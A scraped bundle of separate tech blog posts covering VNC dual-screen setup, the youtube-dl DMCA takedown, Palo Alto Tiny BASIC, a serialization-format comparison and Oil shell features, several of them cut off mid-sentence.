<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless sceen</p></div></div>]]>

		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
<p>In light of distributed source code hosting platforms such as Git, thousands of developers have the public domain youtube-dl source code stored <em>locally</em>, hence the claim to remove the source code is impossible.</p>
<p>Nevertheless, there are still ways to access this source code. For starters, the <code>youtube-dl</code> module is still available on <a href="https://pypi.org/project/youtube_dl/">PyPi</a>, a package hosting platform for Python. Also, <a href="https://gitee.com/mirrors/youtube-downloader">Gitee (a Chinese Git platform)</a> contains a copy of youtube-dl in its entirety.</p>
<p>I would encourage you all to create mirrors on alternative Git hosting platforms. I'm more than happy to update this article with any further information.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
				




<p><a href="https://maly.cz/">Martin Malý</a> has adapted Version 2 of Li Chen Wang’s <a href="https://en.wikipedia.org/wiki/Tiny_BASIC#Palo_Alto_Tiny_BASIC">Palo Alto Tiny BASIC</a> to run on his <a href="https://www.asm80.com/">ASM80</a> browser-based assembler and emulator. I’ve uploaded <a href="https://github.com/Geddd/PATB4ASM80">the source code</a>, with his permission, to GitHub.</p>



<p><strong>Background</strong></p>



<p>Palo Alto Tiny BASIC emerged out of the Tiny BASIC movement started by People’s Computer Company and taken up by the Homebrew Computer Club. Fellow members Steve Wozniak and Tom Pittman would develop their own BASICs (Integer BASIC and 6800 Tiny BASIC respectively). Wang analyzed the Altair BASIC code and contributed edits to Tiny BASIC Extended. Wang published in the newsletter a loader for the 8080, commenting on the <em>Open Letter to Hobbyists:</em></p>



<blockquote><p>Altair Basic has a bootstrap loader of twenty or twenty one bytes long. In principle, you can use this bootstrap to load in your own loader which will then load in your program. However, since Mr. Bill Gates claims that he did not yet payed [sic] enough and is in the mood of calling people thieves. (See HBCC newsletter ’12-1.) I decided to code one myself. What comes out is a bootstrap of sixteen bytes long. This is still too long, maybe our professional experts can make it shorter. For the time being you are welcome to copy mine and I will not call you a thief (this includes Mr. Gates).</p></blockquote>



<p>No surprise then that Li Chen Wang made his BASIC implementation available for free. (I found this quote reading old Homebrew newsletter articles in my research for the <a href="http://troypress.com/basic-interpreters-new-wikipedia-article/" data-type="post" data-id="853">BASIC interpreter article</a>.)</p>



<p>The only smaller implementation of Tiny BASIC was <a href="http://troypress.com/the-dialects-of-tiny-basic/" data-type="post" data-id="878">MINOL</a>, which used unsigned bytes instead of signed integers and which used nonstandard commands. Also weighing in under 2kB, when a common method of shipping interpreters was 4kB ROMs, Palo Alto Tiny BASIC supported a more typical version of the language while leaving extensive room for customization for specific hardware, something which was taken advantage of multiple times, for the TRS-80, the <a href="http://troypress.com/astro-basic/" data-type="post" data-id="867">Bally Astrocade</a>, the Sharp PC-1211, and the Cromemco.</p>



<p><strong>The Code</strong></p>



<p>It’s been fun to play with the source code that was behind three of the computers I used as a kid. Some things I learnt:</p>



<ul><li>The code is very well structured and extensible. I added a few commands in under an hour (<em>PEEK, FRE()</em>). All you need to do is insert new commands in the keyword table, then adapt code elsewhere.</li><li>I was very excited to find a few small bugs in the code:<ul><li>The system famously had only three error messages (“WHAT?” for syntax errors, “HOW?” for functional errors, and “SORRY” for capacity issues). If you execute a <em>RETURN</em> with no corresponding <em>GOSUB</em> you get a &nbsp;“WHAT?” instead of a “HOW?”</li></ul><ul><li><em>10 INPUT “HELLO WORLD” </em>acts like a valid <em>PRINT</em> statement when it should cause a syntax error, since no variable is specified to receive the input.</li></ul><ul><li>The language only supports integers, but decimals aren’t ignored as they should be. <em>PRINT 1.1, 1.2</em> outputs <em>1</em> and <em>0</em>.</li></ul></li><li>There’s an Easter egg! “W”, “AN”, “G”</li></ul>

<p><strong>RST 1 Routine</strong></p>



<p>The RST 1 routine is a work of art, using the call stack to determine where its parameters are, with the byte after RST 1 specifying the character to match and the byte after that specifying the offset to jump to. Wang’s ability to write such memory-efficient code is why he didn’t need to implement the <a href="http://troypress.com/the-tiny-basic-interpretive-language-il-and-onions/" data-type="post" data-id="249">IL virtual machine</a>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikipage">

<p>I want to take a brief look at various data serialization formats and compare them. Basically the goal is to answer the question, “can we find something better than JSON?” However, note that we are looking at these things for DATA SERIALIZATION, not for config files and stuff, so that’s the goal by which these will be judged.</p>
<p>There’s two orthogonal axes to look at these things under:</p>
<ul>
<li>Self-describing vs.&nbsp;schema-defined formats</li>
<li>Human readable vs.&nbsp;machine-readable formats</li>
</ul>
<p>That is, whether the type information for a structure is defined in a separate file (a schema) that a receiving program checks against, or whether the message itself contains type information. It’s almost exactly the difference between statically and dynamically typed programming languages. Like programming languages, both have pros and cons, neither of them are always better than the other. The goal of this is to compare apples to apples, so we’re gonna note which category these things fall into but not make value judgements based on them. There’s also fuzzy edges; many self-describing formats optionally have a schema layer too. Similarly, we will not really compare tooling quality; the goal is to look at the intrinsic properties of the formats. The culture surrounding them may be considered though.</p>
<p>This is also important not to conflate with an RPC protocol, though many of these things are used IN RPC protocols. Keep in mind that HTTP/REST interfaces are often just a type of RPC protocol, whether realized that way or not.</p>
<p>Up to date as of October 2020. Doesn’t try to include myriad minor things, ’cause there’s only so much time in the world.</p>

<h2 id="json">JSON</h2>
<p><a href="http://json.org/">http://json.org/</a></p>
<p>What everything gets currently compared against. We all know JSON, we all agree it’s Sorta Good Enough but really is kinda crap.</p>
<p><strong>Category:</strong> Human-readable, self-describing. (<a href="https://json-schema.org/">https://json-schema.org/</a> exists but does not seem very widely used.) Has an <a href="https://en.wikipedia.org/wiki/JSON-RPC">RPC protocol</a> but it also seems lightly used, <a href="https://jsonapi.org/">this</a> might be more general.</p>
<p><strong>Users:</strong> Everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Similar to major programming languages – Easy to understand and debug</li>
<li>Simple – Easy to read, write, and understand… at least for simple things. <a href="http://seriot.ch/parsing_json.php">Turns out there’s a lot of gotcha’s though.</a></li>
<li>Pretty compact if minified</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is pretty shit – no date/time, no real integers, no real structs, no unions/tuples/etc</li>
<li>Tends to discourage schema’s – “So simple it doesn’t need it”, until it becomes less simple.</li>
<li>No normalized form – fields may be reordered, <em>duplicated</em>, etc. Makes hashing it hard, gotta read whole message to begin verifying it, etc.</li>
<li>No comments – harder to write well than you might think!</li>
<li>No good way to contain binary data</li>
</ul>
<h2 id="yaml">YAML</h2>
<p><a href="https://yaml.org/">https://yaml.org/</a></p>
<p>Started out as a simpler alternative to XML.</p>
<p><strong>Category:</strong> Human-readable, self-describing.</p>
<p><strong>Users:</strong> Lots of people</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Vaguely simple to read and write, in its basic form</li>
<li>Low visual noise</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Way too complicated – they made it a strict superset of JSON for some damn reason, and nobody uses that form, so it’s just a pile of wasted effort</li>
<li>Reference impl incomplete, other impl’s disagree with each other and the spec</li>
</ul>
<h2 id="xml">XML</h2>
<p><a href="https://en.wikipedia.org/wiki/XML">https://en.wikipedia.org/wiki/XML</a></p>
<p>Not sure anyone really knows how XML happened. It’s basically the W3C’s fault, I think? It’s okay for some things but in the end I’m not sure it’s something anyone actually <em>wants</em> to use, it’s just going to be one more of those mistakes of the past.</p>
<p><strong>Category:</strong> Human-readable, self-describing with common schema usage. Has an <a href="https://en.wikipedia.org/wiki/XML-RPC">RPC protocol</a> and many other complicated things.</p>
<p><strong>Users:</strong> Everyone who can’t avoid it.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Promotes schemas and validation</li>
<li>Simple to use for simple things</li>
<li>Actually pretty decent for documents</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>I’ve never gotten schemas and validation to actually work in practice</li>
<li>Everything is string-ly typed</li>
<li>No real arrays</li>
<li>Complicated as frig</li>
<li>Very verbose</li>
<li>There’s like 3-4 different ways to do everything</li>
<li>Still no good way to contain binary data</li>
</ul>

<h2 id="protobuf">Protobuf</h2>
<p><a href="https://developers.google.com/protocol-buffers/">https://developers.google.com/protocol-buffers/</a></p>
<p>aka Protocol Buffers, but that’s a pretty dumb name. Google’s common, fast on-the-wire serialization format.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Has an <a href="https://grpc.io/">RPC protocol</a> built around it.</p>
<p><strong>Users:</strong> Google, basically everyone</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Basically reasonable</li>
<li>Now has some support for versioning schemas, though it’s a hard problem in general</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Backed by Google, so it’s going to be good at the things Google values</li>
<li>Not particularly simple</li>
<li>Wire protocol may be more work than it needs to be</li>
<li>Its type system <a href="http://reasonablypolymorphic.com/blog/protos-are-wrong/index.html">could maybe be better</a></li>
</ul>
<h2 id="capn-proto">Cap’n Proto</h2>
<p><a href="https://capnproto.org/">https://capnproto.org/</a></p>
<p>The Other Binary Serialization Protocol.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC, which is built in to the reference implementation.</p>
<p><strong>Users:</strong> sandstorm.io, Cloudflare?, various other people but it doesn’t seem like that many</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed to be fast</li>
<li>Made by one of the people who worked heavily on Protobuf at Google, so <a href="https://capnproto.org/faq.html#how-do-i-make-a-field-required-like-in-protocol-buffers">there’s lots of experience behind it</a>. That said, doesn’t mean this cat’s always <em>right</em>, but there’s certainly opinions that are trying to be expressed.</li>
<li>Sophisticated RPC comes as part of the standard package</li>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
<li>Adorable name</li>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Very explicit about correctness and conformance things such as field ordering and layout</li>
<li>Lots of the docs and concepts are pretty low level, you usually ain’t gonna need it</li>
<li>Seems more complicated than protobuf – this might be one reason there’s fewer 3rd-party implementations</li>
</ul>
<h2 id="thrift">Thrift</h2>
<p><a href="https://thrift.apache.org/">https://thrift.apache.org/</a></p>
<p>Apache’s version of Protobuf. Does anyone actually use this? Facebook, apparently, since they invented it and then gave it to Apache. Anyone else?</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Designed primarily for RPC.</p>
<p><strong>Users:</strong> Basically mostly Facebook? Twitter and AirBNB also apparently use it, so apparently it’s not UNpopular.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>It works?</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Docs suck</li>
<li>Apache is the tragic junkyard of open source projects</li>
<li>Apparently still not as good as flatbuffers, see below</li>
</ul>
<h2 id="flatbuffers">Flatbuffers</h2>
<p><a href="https://google.github.io/flatbuffers/">https://google.github.io/flatbuffers/</a></p>
<p>Feels a little like Google’s answer to Cap’n Proto, as it has some of the same design goals – zero-copy serialization and layouts that are more amenable to versioning.</p>
<p><strong>Category:</strong> Machine-readable, schema-defined. Includes RPC protocol.</p>
<p><strong>Users:</strong> Google, Cocos2D, Facebook’s mobile client</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Designed for zero-copy deserialization</li>
<li>Designed for schema to evolve</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda feels like the problem is already solved by capnp</li>
<li>Includes a JSON parser for some reason?</li>
<li>Type system is kinda anemic with regards to unions</li>
</ul>
<h2 id="cbor">CBOR</h2>
<p><a href="https://cbor.io/">https://cbor.io/</a></p>
<p>Basically a binary re-imagining of JSON.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> ???</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Pretty good type system – there’s things like fixnum’s, datetime’s, blobs, etc</li>
<li>Compact</li>
<li>Built-in extensibility</li>
<li>Designed to be a drop-in replacement for JSON</li>
<li>IETF standard</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Kinda more complicated than it needs to be, though this is for the sake of compactness and comprehensive types. Numbers are densely packed into fewer bits when possible, for example.</li>
<li>Doesn’t actually seem that widely adopted for some reason?</li>
</ul>
<h2 id="msgpack">Msgpack</h2>
<p><a href="https://msgpack.org/">https://msgpack.org/</a></p>
<p>The Other CBOR, or rather, <a href="https://news.ycombinator.com/item?id=14067747">CBOR is derived from this</a>. Designed to be simple and compact. Kinda a <em>lot</em> like a slightly chopped down CBOR, actually, their integer specification stuff looks nearly identical.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> Redis, a few others?</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Simple</li>
<li>Compact</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Specification is kinda weak</li>
<li>No real tuple or enum types</li>
<li>Why not just CBOR?</li>
</ul>
<h2 id="bson">BSON</h2>
<p><a href="http://bsonspec.org/">http://bsonspec.org/</a></p>
<p>As the name implies, a binary-ifcation of JSON. Created by MongoDB as its internal data format.</p>
<p><strong>Category:</strong> Machine-readable, self-describing.</p>
<p><strong>Users:</strong> MongoDB</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Type system is full of deprecated and MongoDB-specific shit but is reasonably pragmatic</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Type system is reasonably pragmatic but is full of deprecated and MongoDB-specific shit</li>
<li><strong>C strings</strong> – though there’s random non-C strings in places as well.</li>
<li>Its arrays are a travesty against serializarion</li>
<li>Basically an implementation detail of MongoDB, and it looks like it</li>
</ul>

<p>Things that are interesting but not actually in the scope of serialization languages, or are otherwise irrelevant.</p>
<h2 id="toml">TOML</h2>
<p><a href="https://github.com/toml-lang/toml">https://github.com/toml-lang/toml</a></p>
<p>Invalid, it’s designed as a config language, not a serialization format. It’s basically an attempt to make something as simple and ubiquitous as windows .INI files that is an actual specification rather than a fashion.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> Various, notably Cargo (Rust’s build tool)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Work well as a config language without deeply nested structures</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Works poorly when you try to make deeply nested structures</li>
</ul>
<h2 id="ron">RON</h2>
<p><a href="https://github.com/ron-rs/ron">https://github.com/ron-rs/ron</a></p>
<p>Rusty Object Notation. Because shoehorning Rust’s ML-y type systeminto JSON isn’t very much fun. Works startlingly well for this purpose but is basically untried elsewhere.</p>
<p><strong>Category:</strong> Human-readable, sorta self-describing though usually you have a specific data structure you’re trying to fit it into.</p>
<p><strong>Users:</strong> A few, notably <a href="https://amethyst.rs/">Amethyst</a>.</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Good type system for sophisticated functional-style languages</li>
<li>Simple and reasonably compact</li>
<li>Actually very good at what it does</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Young, underspecified, Rust-centric</li>
</ul>
<h2 id="bincode">Bincode</h2>
<p><a href="https://github.com/servo/bincode">https://github.com/servo/bincode</a></p>
<p>Included mainly for completeness. It’s not standardized outside of a single particular implementation which doesn’t promise stability, so not intended for general-purpose use. It’s intended as a fast and easy RPC/IPC format for Servo, and the actual format is basically an implementation detail of that goal.</p>
<p><strong>Users:</strong> Servo, programs written by introverts who don’t care about being able to talk to each other. (Turns out this is a useful niche though, who knew.)</p>
<p><strong>Pros:</strong></p>
<ul>
<li>Compact, fast, simple.</li>
<li>Works basically transparently for IPC with Rust code.</li>
</ul>
<p><strong>Cons:</strong></p>
<ul>
<li>Anything other than that specific version of that specific library is …</li></ul></div></div>

  2020-10-22
</p>

<p>On a <a href="https://lobste.rs/s/6bphbw/fennel_programming_language_rationale">lobste.rs thread</a> about the rationale for the Fennel language, I
posted this summary of why Oil exists:</p>
<blockquote>
<p>I think these features alone would justify a new shell:</p>
<ol>
<li>Getting rid of "quoting hell"</li>
<li>Getting rid of ad hoc parsing and splitting</li>
<li>Fixing errexit</li>
</ol>
<p>But Oil has a lot more than that, including unifying separate ad hoc
expression languages ...</p>
</blockquote>
<p>This post elaborates on these points.  I've condensed the rationale into four
critical features for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a>.</p>
<p>I give examples of each feature, link to docs (in progress), and comment on the
future of the project.</p>
 
<a name="the-osh-language"></a>
<h2>The OSH Language</h2>
<p>Recall that <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH</a> is designed to run existing shell scripts, and
has done that <a href="http://www.oilshell.org/blog/2018/01/15.html">since early 2018</a>.</p>
<p>It also fixes warts in the shell language with <strong>opt-in</strong> features.  These are
the four most important ones.</p>
<a name="reliable-error-handling"></a>
<h3>Reliable Error Handling</h3>
<p>I just finished an overhaul of shell's flaky <code>set -e</code> / <code>errexit</code> mechanism.
I'm excited by this, because I started it last year, but put it on the back
burner after being stumped!</p>
<p>I believe I've figured out every problem now, and would like your feedback.
The simple invariant is that <strong>OSH never loses an exit code</strong>, which is not
true of POSIX shell or <a href="http://www.oilshell.org/cross-ref.html?tag=bash#bash">bash</a>.  Here's a summary of the enhancements:</p>
<ul>
<li><code>strict_errexit</code> - A shell option to <strong>detect</strong> cases where you would lose
errors in shell, like <code>if myfunc</code>.  This improves your shell scripts, even if
you run them under another shell!  In other words, OSH can be used as a dev
tool.</li>
<li><code>inherit_errexit</code> - OSH implements this bash 4.4 option, which is a partial
fix for the "command sub errexit" problem.</li>
<li><code>command_sub_errexit</code> - A shell option to check for failure at the end of
every command sub, so you don't lose errors.
<ul>
<li>This fixes the problem shown in the last panel of a <a href="https://wizardzines.com/comics/bash-functions/">recent
comic by Julia Evans</a>:
<em>"bash is weird sometimes"</em></li>
</ul>
</li>
<li><code>process_sub_fail</code> - Like <code>pipefail</code>, but for process substitutions.  It
allows <code>errexit</code> to "see" the failure caused by process subs, like the <code>sort</code>
invocation in <code>cat foo.txt &lt;(sort /oops/error)</code>,
<ul>
<li><code>@_process_sub_status</code>: A variable that's analogous to <code>${PIPESTATUS[@]}</code>.
You may want to inspect the exit status of all processes.</li>
</ul>
</li>
<li>The <code>run</code> builtin turns <code>errexit</code> back on, so <code>if run myfunc</code> is safe.  It
also provides fine-grained control over exit codes.</li>
</ul>
<p>Yes, there are many solutions, because shell has many problems!  But you don't
have to remember all these names.  Add <code>shopt --set oil:basic</code> to the top of
your program to turn all options.  The <code>strict_errexit</code> failures will remind
you to use the <code>run</code> wrapper.</p>
<p>(Aside: I was able to fix all these problems cleanly in the interpreter.  I
spent time a lot of time on <a href="https://www.oilshell.org/blog/2016/11/29.html">Oil's architecture 4 years
ago</a> precisely so I could fix
such subtle problems.  When the code has a good structure, the "right place"
for a fix reveals itself to you.  Oil is still improving!)</p>
<a name="safe-processing-of-user-supplied-data-like-filenames"></a>
<h3>Safe Processing of User-Supplied Data (like filenames)</h3>
<p><a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> is the foundation for <a href="https://github.com/oilshell/oil/wiki/Structured-Data-in-Oil">Structured Data in
Oil</a>.  It removes
the need to invent ad hoc (and often broken) formats every time you need to
deal with user-supplied data in shell.  In other words, Oil scripts have an
alternative to messy parsing and splitting.</p>
<p>I just implemented a <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, after implementing an encoder earlier
this year.</p>
<p>Here are some short examples.  The <code>write</code> builtin prints its args to stdout,
and it accepts a <code>--qsn</code> flag:</p>
<pre><code># Print filenames ONE PER LINE.  If a name contains a
# newline or other special char, it's QSN-encoded like
# 'multi-line \n name with NUL \0 byte'

write --qsn -- *.txt
</code></pre>
<p>The <code>read</code> builtin provides the inverse:</p>
<pre><code>cat list.txt | while read --line --qsn {
  # _line is implictly set by 'read'
  rm -- $_line
}
</code></pre>
<p>I also implemented <code>read -0</code> as a synonym for bash's obscure <code>read -r -d ''</code>.
This allows you to consume <code>find -print0</code> output in shell, like <code>xargs -0</code>
does.  This format is distinct from QSN, but it's now easy to convert back and
forth between them.</p>
<p>This is the first cut of <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> support.  I expect it to evolve based on your
feedback!</p>

</ul>
<a name="eliminate-quoting-hell-the-qefs-problem"></a>
<h3>Eliminate Quoting Hell (the <code>!qefs</code> problem)</h3>
<p>This was done in summer 2019.  I described it in <a href="http://www.oilshell.org/release/latest/doc/simple-word-eval.html">Simple Word
Evaluation</a> earlier this year, and you can see examples in
<a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language Idioms</a>.</p>
<p>Briefly, Oil allows this:</p>
<pre><code>ls @myflags $filename
</code></pre>
<p>instead of</p>
<pre><code>ls "${myflags[@]}" "$filename"
</code></pre>
<p>Notice the <code>@</code> splice operator, and lack of quotes.</p>
<a name="static-parsing-enables-better-error-messages-and-tools"></a>
<h3>Static Parsing Enables Better Error Messages and Tools</h3>
<p>This blog began in 2016 with an explanation of <a href="http://www.oilshell.org/blog/2016/10/22.html">static
parsing</a>.  I didn't mention it in the comment quoted in
the intro, but it's still a crucial part of the project.</p>
<p>I was reminded how important this is when noticing that the authors of both
Perl 5 and the rc shell <a href="https://lobste.rs/s/7bpgbl/rc_plan_9_shell#c_mokqrn">made complaints about shell's dynamic
parsing</a>, going back 20-30
years!</p>
<p>This foundation is still paying dividends.  I recently used the static parser
to create detailed error messages for command subs:</p>
<pre><code><span>$</span> <span>shopt --set errexit command_sub_errexit</span>

<span>$</span> <span>d=$(date %x)</span>
date: invalid date ‘%x’
  d=$(date %x)
    ^~
[ interactive ]:13: fatal: Command sub exited with status 1 ...
</code></pre>
<p>and process subs:</p>
<pre><code><span>$</span> <span>shopt --set process_sub_fail</span>

<span>$</span> <span>cat /dev/null &lt;(sort oops)</span>
sort: cannot read: oops: No such file or directory
  cat /dev/null &lt;(sort oops)
                ^~
[ interactive ]:27: fatal: Exiting with status 2 ...
</code></pre>
<p>We point to the location of the failing construct.  No other shell does this!</p>
<p>In addition, Travis Everett has worked on a shell dependency bundler which
relies on static parsing.</p>
<ul>
<li>Related: The new <a href="http://www.oilshell.org/release/latest/doc/syntactic-concepts.html">Syntactic Concepts</a> doc lists static parsing as
one of 5 important concepts.</li>
</ul>
<a name="whats-next-for-the-project"></a>
<h2>What's Next For the Project?</h2>
<p>It was indeed useful to explicitly write out rationale for the language.  I've
done that many times with posts tagged #<a href="http://www.oilshell.org/blog/tags.html?tag=why-a-new-shell#why-a-new-shell">why-a-new-shell</a>, but
explaining it again helps, even after 4 years.  The project is evolving and
getting crisper.</p>
<a name="a-very-important-claim"></a>
<h3>A Very Important Claim</h3>
<p>With the overhaul of <code>errexit</code> and the <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a> decoder, I believe we now have
all the bases for the <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> covered!  These features
will be out with the next release.</p>
<p>The claim is that <strong>these four features alone justify a new Unix shell</strong>.  If
we finish the C++ translation, and end the project here, it would be
worthwhile.</p>
<p>To repeat, they are:</p>
<ol>
<li>Reliable error handling.  I can't recommend shell to my friends without
these fixes.</li>
<li>Safe processing of user-supplied data, i.e. an alternative to ad hoc parsing
and splitting.</li>
<li>Elimination of "quoting hell".  Let's fix it once and for all, rather than
admonishing every new shell programmer about it for the next 30 years, as
has been done for the past 30!</li>
<li>Static Parsing for better error messages and tools.  It also removes a
security issue.</li>
</ol>
<p>If you disagree, <a href="https://old.reddit.com/r/oilshell/comments/jg54gd/four_features_that_justify_a_new_unix_shell/?">let me know</a>!  I would like to hear what other
warts in the <strong>shell language</strong> need to be fixed or otherwise addressed.</p>
<p>(I'm leaving out the interactive shell here, as I believe the first priority is
a better shell for programming and automation.  A "cloud shell", if you will.)</p>
<a name="reviewing-the-biggest-cut-january-2020"></a>
<h3>Reviewing The Biggest Cut (January 2020)</h3>
<p>Back in January, I was already <strong>concerned about the scope</strong> of the project.  I
wrote that <a href="http://www.oilshell.org/blog/2020/01/ambitions.html#the-biggest-cut">the biggest cut</a> to the
project would be that Oil would be based on <strong>strings</strong>, rather than
Python-like data types.</p>
<p>Let me update that statement based on these crisp definitions:</p>
<ul>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=osh-language#osh-language">OSH language</a> is a compatible shell based on <strong>strings</strong>
(and arrays of strings).  Assignments look like <code>local x=mystr</code>.</li>
<li>The <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil language</a> has Python-like <strong>types and expressions</strong>.
Assignments look like <code>var x = 42 + a[i] + f(x, y)</code>.  It has a
garbage-collected heap of recursive data structures.</li>
</ul>
<p>So what I'm saying now is that the priority going forward is to
<strong>polish the OSH language</strong>, and put off the Oil language until the hazy
future.</p>
<p>That means finishing the translation to C++, hooking up the <a href="http://www.oilshell.org/blog/2020/08/risks.html#garbage-collection">garbage
collector</a>, and writing <a href="http://www.oilshell.org/release/latest/doc">documentation</a>.  It may mean preparing the code to
be embedded in another application, like the <a href="http://www.oilshell.org/cross-ref.html?tag=fish#fish">fish</a> shell.  (I've
